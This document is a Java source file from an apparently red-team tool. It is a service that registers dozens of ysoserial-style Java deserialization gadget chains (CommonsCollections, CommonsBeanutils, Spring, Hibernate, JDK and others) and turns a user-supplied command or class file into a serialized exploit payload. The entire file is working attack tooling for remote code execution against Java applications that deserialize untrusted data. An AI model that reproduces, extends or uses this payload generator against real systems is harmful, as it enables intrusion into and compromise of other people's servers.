package com.potato.potatotool.content.redTeam.payload.yso;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.C3P0;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.AspectJWeaver;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.BeanShell1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Click1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Clojure;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsBeanutils1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsBeanutils1_183;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsBeanutils2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsBeanutils2_183;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsBeanutils3;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsBeanutils3_183;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections10;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections11;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections3;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections4;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections5;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections6;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections7;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections8;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollections9;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollectionsK1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.CommonsCollectionsK2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.FileUpload1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Groovy1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Hibernate1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Hibernate2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Jdk7u21;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Jdk8u20;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.JSON1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.JBossInterceptors1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.JavassistWeld1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Jython1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.MozillaRhino1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.MozillaRhino2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Myfaces1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Myfaces2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.ObjectPayload;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.ROME;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Spring1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Spring2;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Spring3;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.URLDNS;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Vaadin1;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.Wicket1;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class YsoPayloadService {
    private static final String CLASS_FILE_PREFIX = "class_file:";
    private final Map<String, YsoPayloadRegistration> registrations = new LinkedHashMap<String, YsoPayloadRegistration>();

    public YsoPayloadService() {
        register(YsoPayloadMetadata.builder("URLDNS", YsoPayloadInputType.URL_OR_DOMAIN)
                .categories(YsoPayloadCategory.DNS_DETECTION)
                .dependencyHint(YsoDependencyHintUtil.summarize(URLDNS.class))
                .verificationHint("HashMap<URL, ?> object stream")
                .build(), new WoodpeckerPayloadBuilder(URLDNS.class));
        register(YsoPayloadMetadata.builder("CommonsBeanutils1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsBeanutils1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsBeanutils1.class));
        register(YsoPayloadMetadata.builder("CommonsCollections1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections1.class));
        register(YsoPayloadMetadata.builder("CommonsCollections2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections2.class));
        register(YsoPayloadMetadata.builder("CommonsCollections3", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections3.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections3.class));
        register(YsoPayloadMetadata.builder("CommonsCollections4", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections4.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections4.class));
        register(YsoPayloadMetadata.builder("CommonsCollections5", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections5.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections5.class));
        register(YsoPayloadMetadata.builder("CommonsCollections6", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections6.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections6.class));
        register(YsoPayloadMetadata.builder("CommonsCollections7", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections7.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections7.class));
        register(YsoPayloadMetadata.builder("CommonsBeanutils2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsBeanutils2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsBeanutils2.class));
        register(YsoPayloadMetadata.builder("CommonsBeanutils1_183", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsBeanutils1_183.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsBeanutils1_183.class));
        register(YsoPayloadMetadata.builder("CommonsBeanutils2_183", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsBeanutils2_183.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsBeanutils2_183.class));
        register(YsoPayloadMetadata.builder("CommonsBeanutils3", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsBeanutils3.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsBeanutils3.class));
        register(YsoPayloadMetadata.builder("CommonsBeanutils3_183", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsBeanutils3_183.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsBeanutils3_183.class));
        register(YsoPayloadMetadata.builder("CommonsCollections8", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections8.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections8.class));
        register(YsoPayloadMetadata.builder("CommonsCollections9", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections9.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections9.class));
        register(YsoPayloadMetadata.builder("CommonsCollections10", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections10.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections10.class));
        register(YsoPayloadMetadata.builder("CommonsCollections11", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollections11.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollections11.class));
        register(YsoPayloadMetadata.builder("AspectJWeaver", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.FILE_OPERATION)
                .dependencyHint(YsoDependencyHintUtil.summarize(AspectJWeaver.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(AspectJWeaver.class));
        register(YsoPayloadMetadata.builder("JavassistWeld1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(JavassistWeld1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(JavassistWeld1.class));
        register(YsoPayloadMetadata.builder("JBossInterceptors1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(JBossInterceptors1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(JBossInterceptors1.class));
        register(YsoPayloadMetadata.builder("Myfaces1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Myfaces1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Myfaces1.class));
        register(YsoPayloadMetadata.builder("Myfaces2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Myfaces2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Myfaces2.class));
        register(YsoPayloadMetadata.builder("BeanShell1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(BeanShell1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(BeanShell1.class));
        register(YsoPayloadMetadata.builder("Jython1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Jython1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Jython1.class));
        register(YsoPayloadMetadata.builder("MozillaRhino1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(MozillaRhino1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(MozillaRhino1.class));
        register(YsoPayloadMetadata.builder("MozillaRhino2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(MozillaRhino2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(MozillaRhino2.class));
        register(YsoPayloadMetadata.builder("FileUpload1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.FILE_OPERATION)
                .dependencyHint(YsoDependencyHintUtil.summarize(FileUpload1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(FileUpload1.class));
        register(YsoPayloadMetadata.builder("C3P0", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(C3P0.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(C3P0.class));
        register(YsoPayloadMetadata.builder("Groovy1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Groovy1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Groovy1.class));
        register(YsoPayloadMetadata.builder("Clojure", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Clojure.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Clojure.class));
        register(YsoPayloadMetadata.builder("Hibernate1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Hibernate1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Hibernate1.class));
        register(YsoPayloadMetadata.builder("Hibernate2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Hibernate2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Hibernate2.class));
        register(YsoPayloadMetadata.builder("Spring1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Spring1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Spring1.class));
        register(YsoPayloadMetadata.builder("Spring2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Spring2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Spring2.class));
        register(YsoPayloadMetadata.builder("Spring3", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .dependencyHint(YsoDependencyHintUtil.summarize(Spring3.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Spring3.class));
        register(YsoPayloadMetadata.builder("ROME", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(ROME.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(ROME.class));
        register(YsoPayloadMetadata.builder("JSON1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(JSON1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(JSON1.class));
        register(YsoPayloadMetadata.builder("Click1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Click1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Click1.class));
        register(YsoPayloadMetadata.builder("Wicket1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.FILE_OPERATION)
                .dependencyHint(YsoDependencyHintUtil.summarize(Wicket1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Wicket1.class));
        register(YsoPayloadMetadata.builder("Vaadin1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Vaadin1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(Vaadin1.class));
        register(YsoPayloadMetadata.builder("CommonsCollectionsK1", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollectionsK1.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollectionsK1.class));
        register(YsoPayloadMetadata.builder("CommonsCollectionsK2", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(CommonsCollectionsK2.class))
                .verificationHint("object stream starts with TC_OBJECT")
                .build(), new WoodpeckerPayloadBuilder(CommonsCollectionsK2.class));
        register(YsoPayloadMetadata.builder("Jdk7u21", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING, YsoPayloadCategory.JDK_INTERNAL)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Jdk7u21.class))
                .verificationHint("offline generation only; target JRE constrained")
                .build(), new WoodpeckerPayloadBuilder(Jdk7u21.class));
        register(YsoPayloadMetadata.builder("Jdk8u20", YsoPayloadInputType.WOODPECKER_COMMAND)
                .categories(YsoPayloadCategory.CLASS_LOADING, YsoPayloadCategory.JDK_INTERNAL)
                .supportsClassFile(true)
                .dependencyHint(YsoDependencyHintUtil.summarize(Jdk8u20.class))
                .verificationHint("raw object stream, not serialized byte[]")
                .build(), new WoodpeckerPayloadBuilder(Jdk8u20.class));
        register(YsoPayloadMetadata.builder("ClassFileWrapper", YsoPayloadInputType.CLASS_FILE)
                .categories(YsoPayloadCategory.CLASS_LOADING, YsoPayloadCategory.LOCAL_HELPER)
                .supportsClassFile(true)
                .dependencyHint("PotatoTool local helper")
                .verificationHint("serializes selected class bytes into ClassFilePayload")
                .build(), new ClassFileWrapperBuilder());
    }

    private void register(YsoPayloadMetadata metadata, YsoPayloadBuilder builder) {
        if (metadata == null || builder == null) {
            throw new IllegalArgumentException("Yso registration is incomplete");
        }
        registrations.put(metadata.getName(), new YsoPayloadRegistration(metadata, builder));
    }

    public List<String> getSupportedGadgets() {
        return Collections.unmodifiableList(new ArrayList<String>(registrations.keySet()));
    }

    public List<String> getSupportedGadgets(YsoPayloadCategory category) {
        return getSupportedGadgets(category, false);
    }

    public List<String> getSupportedGadgets(YsoPayloadCategory category, boolean classFileOnly) {
        List<YsoPayloadMetadata> metadataList = getSupportedGadgetMetadata(category, classFileOnly);
        List<String> result = new ArrayList<String>();
        for (YsoPayloadMetadata metadata : metadataList) {
            result.add(metadata.getName());
        }
        return Collections.unmodifiableList(result);
    }

    public List<YsoPayloadMetadata> getSupportedGadgetMetadata() {
        return getSupportedGadgetMetadata(YsoPayloadCategory.ALL, false);
    }

    public List<YsoPayloadMetadata> getSupportedGadgetMetadata(YsoPayloadCategory category, boolean classFileOnly) {
        YsoPayloadCategory selected = category == null ? YsoPayloadCategory.ALL : category;
        List<YsoPayloadMetadata> result = new ArrayList<YsoPayloadMetadata>();
        for (YsoPayloadRegistration registration : registrations.values()) {
            if (!registration.metadata.hasCategory(selected)) {
                continue;
            }
            if (classFileOnly && !registration.metadata.supportsClassFile()) {
                continue;
            }
            result.add(registration.metadata);
        }
        return Collections.unmodifiableList(result);
    }

    public YsoPayloadMetadata getMetadata(String gadget) {
        if (gadget == null) {
            return null;
        }
        YsoPayloadRegistration registration = registrations.get(gadget.trim());
        return registration == null ? null : registration.metadata;
    }

    public String getPreferredClassFileGadget() {
        for (YsoPayloadRegistration registration : registrations.values()) {
            if (registration.metadata.supportsClassFile()
                    && !registration.metadata.getCategories().contains(YsoPayloadCategory.LOCAL_HELPER)
                    && registration.metadata.isImplemented()) {
                return registration.metadata.getName();
            }
        }
        for (YsoPayloadRegistration registration : registrations.values()) {
            if (registration.metadata.supportsClassFile() && registration.metadata.isImplemented()) {
                return registration.metadata.getName();
            }
        }
        return null;
    }

    public byte[] generate(YsoPayloadRequest request) throws Exception {
        if (request == null) {
            throw new IllegalArgumentException("Yso payload request is null");
        }
        String gadget = request.getGadget() == null ? "" : request.getGadget().trim();
        YsoPayloadRegistration registration = registrations.get(gadget);
        if (registration == null || !registration.metadata.isImplemented()) {
            throw new IllegalArgumentException("Unsupported yso gadget: " + request.getGadget());
        }
        Object object = registration.builder.build(request.getCommand());
        byte[] bytes = toPayloadBytes(object);
        if (bytes == null || bytes.length == 0) {
            throw new IllegalStateException("Yso payload bytes are empty: " + gadget);
        }
        return bytes;
    }

    private interface YsoPayloadBuilder {
        Object build(String command) throws Exception;
    }

    private static class YsoPayloadRegistration {
        private final YsoPayloadMetadata metadata;
        private final YsoPayloadBuilder builder;

        private YsoPayloadRegistration(YsoPayloadMetadata metadata, YsoPayloadBuilder builder) {
            this.metadata = metadata;
            this.builder = builder;
        }
    }

    private static class WoodpeckerPayloadBuilder implements YsoPayloadBuilder {
        private final Class<? extends ObjectPayload<?>> payloadClass;

        private WoodpeckerPayloadBuilder(Class<? extends ObjectPayload<?>> payloadClass) {
            this.payloadClass = payloadClass;
        }

        @Override
        public Object build(String command) throws Exception {
            String value = requireText(command, payloadClass.getSimpleName() + " command");
            ObjectPayload<?> payload = payloadClass.newInstance();
            return payload.getObject(normalizeCommand(payloadClass, value));
        }
    }

    private static class ClassFileWrapperBuilder implements YsoPayloadBuilder {
        @Override
        public Object build(String command) throws Exception {
            String value = requireText(command, "class_file command");
            if (!value.toLowerCase().startsWith(CLASS_FILE_PREFIX)) {
                throw new IllegalArgumentException("ClassFileWrapper command must start with class_file:");
            }
            String filePath = value.substring(CLASS_FILE_PREFIX.length()).trim();
            if (filePath.isEmpty()) {
                throw new IllegalArgumentException("class_file path is empty");
            }
            File file = new File(filePath);
            if (!file.isFile()) {
                throw new IllegalArgumentException("class_file does not exist: " + filePath);
            }
            byte[] bytes = Files.readAllBytes(file.toPath());
            if (bytes.length == 0) {
                throw new IllegalArgumentException("class_file is empty: " + filePath);
            }
            return new ClassFilePayload(file.getName(), bytes);
        }
    }

    private static String requireText(String value, String label) {
        if (value == null || value.trim().isEmpty()) {
            throw new IllegalArgumentException(label + " is empty");
        }
        return value.trim();
    }

    private static String normalizeCommand(Class<? extends ObjectPayload<?>> payloadClass, String value) {
        if (payloadClass == URLDNS.class && !value.contains("://")) {
            return "http://" + value;
        }
        return value;
    }

    private static byte[] toPayloadBytes(Object object) throws Exception {
        if (object instanceof byte[]) {
            byte[] bytes = (byte[]) object;
            if (looksLikeSerializationStream(bytes)) {
                return bytes;
            }
        }
        return serialize(object);
    }

    private static boolean looksLikeSerializationStream(byte[] bytes) {
        return bytes != null
                && bytes.length > 4
                && bytes[0] == (byte) 0xac
                && bytes[1] == (byte) 0xed
                && bytes[2] == 0x00
                && bytes[3] == 0x05;
    }

    private static byte[] serialize(Object object) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objectOut = new ObjectOutputStream(out);
        try {
            objectOut.writeObject(object);
        } finally {
            objectOut.close();
        }
        return out.toByteArray();
    }
}
